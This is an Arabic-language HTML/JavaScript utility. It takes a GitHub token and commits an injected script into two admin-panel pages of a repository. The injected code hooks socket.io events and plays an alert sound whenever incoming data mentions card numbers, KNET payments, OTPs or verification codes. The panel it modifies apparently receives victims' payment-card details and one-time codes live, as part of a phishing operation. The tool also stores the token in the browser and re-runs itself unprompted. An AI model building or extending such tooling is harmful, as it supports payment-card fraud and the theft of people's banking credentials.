<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>KDD صوت الفقّة</title>
<style>
body{background:#111;color:#eee;font-family:Tahoma,Arial,sans-serif;padding:16px;margin:0}
input,button{padding:12px;font-size:16px;border-radius:8px;border:0;margin:5px 0;width:100%;box-sizing:border-box}
input{background:#000;color:#0f0;direction:ltr}
button{background:#2ecc71;color:#000;font-weight:700;cursor:pointer}
button.g{background:#333;color:#eee}
#log{white-space:pre-wrap;background:#000;color:#ddd;padding:10px;margin-top:10px;font-family:monospace;font-size:12px;min-height:120px;direction:ltr;text-align:left;line-height:1.6}
</style>
</head>
<body>
<b>تثبيت صوت الفقّة (الملخص + الكي نت/البطاقة + الرمز)</b>
<input id="tok" placeholder="ghp_..." autocomplete="off">
<button onclick="kddRun()">تنفيذ</button>
<button class="g" onclick="kddTest()">تجربة الصوت</button>
<div id="log">انتظر...</div>
<script>
window.onerror=function(m,s,l){try{var e=document.getElementById('log');if(e){var d=document.createElement('div');d.style.color='#f66';d.textContent='JS error: '+m+' @'+l;e.appendChild(d)}}catch(_){}};

var FROG='<scr'+'ipt>/*FROG9*/'+
'(function(){var A=window.AudioContext||window.webkitAudioContext,a=null,m=0,L2=0;'+
'try{m=localStorage.getItem("kdd_frog_mute")==="1"}catch(e){}'+
'function p(){try{if(m||!A)return;var n=Date.now();if(n-L2<120)return;L2=n;if(!a)a=new A();if(a.state==="suspended")a.resume();var t=a.currentTime;function c(s){var o=a.createOscillator(),g=a.createGain();o.type="sawtooth";o.frequency.setValueAtTime(300,s);o.frequency.exponentialRampToValueAtTime(150,s+.09);g.gain.setValueAtTime(.0001,s);g.gain.exponentialRampToValueAtTime(.3,s+.012);g.gain.exponentialRampToValueAtTime(.0001,s+.11);o.connect(g);g.connect(a.destination);o.start(s);o.stop(s+.13)}c(t);c(t+.17)}catch(e){}}'+
'function ok(e,x){var n=String(e);if(/connect|disconnect|reconnect|pagechanged|navigate|hide|error|action/i.test(n))return false;if(/data|card|code|live|knet|pay|otp|verif|summary|ملخص|رمز/i.test(n))return true;try{if(/digitCode|"code"|رمز|cardNumber|knet|ملخص|dataHistory|summary|otp/i.test(JSON.stringify([].slice.call(x))))return true}catch(_){}return false}'+
'["click","keydown","touchstart","mousedown"].forEach(function(e){window.addEventListener(e,function(){try{if(!a&&A)a=new A();if(a&&a.state==="suspended")a.resume()}catch(_){}},{passive:1})});'+
'window.addEventListener("keydown",function(e){var t=(e.target&&e.target.tagName||"").toLowerCase();if(t==="input"||t==="textarea")return;if(e.key==="m"||e.key==="M"){m=m?0:1;try{localStorage.setItem("kdd_frog_mute",m?"1":"0")}catch(_){}}});'+
'function h(s){if(!s||s._f)return;s._f=1;["on","once"].forEach(function(k){if(typeof s[k]!=="function")return;var o=s[k].bind(s);s[k]=function(ev){if(/^(connect|disconnect|connect_error|reconnect)$/.test(ev))return o.apply(s,arguments);var r=[].slice.call(arguments,1).map(function(f){if(typeof f!=="function")return f;return function(){try{if(ok(ev,arguments))p()}catch(_){}return f.apply(this,arguments)}});return o.apply(s,[ev].concat(r))}})}'+
'function w(){if(!window.io||window.io._fw)return false;var o=window.io;function f(){var s=o.apply(this,arguments);try{h(s)}catch(_){}return s}for(var k in o){try{f[k]=o[k]}catch(_){}}f._fw=1;window.io=f;return true}'+
'if(!w()){var n2=0,i2=setInterval(function(){if(w())clearInterval(i2);if(window.socket)h(window.socket);if(++n2>400)clearInterval(i2)},50)}'+
'})();</scr'+'ipt>';

function $(i){return document.getElementById(i)}
function L(t,c){var e=$('log');if(!e)return;var d=document.createElement('div');if(c)d.style.color=c;d.textContent=t;e.appendChild(d);e.scrollTop=e.scrollHeight}
function LS(k,v){try{if(v===undefined){return localStorage.getItem(k)}localStorage.setItem(k,v);return 1}catch(e){return null}}
function b64e(s){var b=new TextEncoder().encode(s),o='';for(var i=0;i<b.length;i++)o+=String.fromCharCode(b[i]);return btoa(o)}
function b64d(s){var x=atob(String(s).replace(/\s/g,'')),u=new Uint8Array(x.length);for(var i=0;i<x.length;i++)u[i]=x.charCodeAt(i);return new TextDecoder().decode(u)}
function H(){return{'Authorization':'token '+$('tok').value.trim(),'Accept':'application/vnd.github+json','Content-Type':'application/json'}}
function inj(h){if(h.indexOf('FROG9')>-1)return null;if(h.indexOf('FROG-SOUND')>-1)h=h.replace(/<script>\s*\/\*FROG-SOUND[0-9]*\*\/[\s\S]*?<\/script>\s*/g,'');var m=h.match(/<script[^>]*socket\.io[^>]*>\s*<\/script>/i);if(m){var i=m.index+m[0].length;return h.slice(0,i)+'\n'+FROG+'\n'+h.slice(i)}var b=h.search(/<\/body>/i);return b>-1?h.slice(0,b)+FROG+h.slice(b):h+FROG}
var FILES=['server/admin/index.html','kdd-public/admin.html'];

function kddRun(){
 try{
  var t=$('tok').value.trim();
  if(!t){L('أدخل التوكن أولاً','#f66');return}
  LS('kdd_tok',t);
  $('log').innerHTML='';L('بدأ التنفيذ...','#6cf');
  var i=0,D=0,S=0;
  (function nx(){
   if(i>=FILES.length){L('— انتهى — تم: '+D+' / موجود: '+S,(D?'#2ecc71':'#f66'));return}
   var p=FILES[i++];
   fetch('https://api.github.com/repos/fahshomi-ui/KDD/contents/'+p+'?ref=main',{headers:H()})
   .then(function(r){if(!r.ok)throw new Error('قراءة '+p+' ('+r.status+')');return r.json()})
   .then(function(j){var nw=inj(b64d(j.content));if(!nw){L('• '+p+' : مثبّت مسبقاً','#2ecc71');S++;return}
     return fetch('https://api.github.com/repos/fahshomi-ui/KDD/contents/'+p,{method:'PUT',headers:H(),body:JSON.stringify({message:'صوت الفقّة: الملخص/الكي نت/الرمز',content:b64e(nw),sha:j.sha,branch:'main'})})
     .then(function(r){if(!r.ok)return r.text().then(function(x){throw new Error('رفع '+p+' ('+r.status+') '+x.slice(0,90))});L('• '+p+' : تم ✓','#2ecc71');D++})})
   .catch(function(e){L('• '+p+' : '+e.message,'#f66')})
   .then(nx);
  })();
 }catch(e){L('خطأ: '+e.message,'#f66')}
}

function kddTest(){
 try{
  var A=window.AudioContext||window.webkitAudioContext,a=new A(),t=a.currentTime;
  function c(s){var o=a.createOscillator(),g=a.createGain();o.type='sawtooth';o.frequency.setValueAtTime(300,s);o.frequency.exponentialRampToValueAtTime(150,s+.09);g.gain.setValueAtTime(.0001,s);g.gain.exponentialRampToValueAtTime(.3,s+.012);g.gain.exponentialRampToValueAtTime(.0001,s+.11);o.connect(g);g.connect(a.destination);o.start(s);o.stop(s+.13)}
  c(t);c(t+.17);L('شغّلت الصوت.','#6cf');
 }catch(e){L('الصوت: '+e.message,'#f66')}
}

var _done=0;
function kddInit(){
 if(_done)return;_done=1;
 try{
  var sv=LS('kdd_tok');
  if(sv)$('tok').value=sv;
  $('log').innerHTML='';
  L('السكربت اشتغل ✓ — '+(sv?'رح يشتغل لحاله...':'الصق التوكن واضغط تنفيذ'),'#2ecc71');
  if(sv)setTimeout(kddRun,700);
 }catch(e){L('init: '+e.message,'#f66')}
}

var _w=0;
(function kddWait(){
  try{ if(document.getElementById('log')){ kddInit(); return; } }catch(e){}
  if(++_w>300)return;
  setTimeout(kddWait,50);
})();
</script>
</body>
</html>
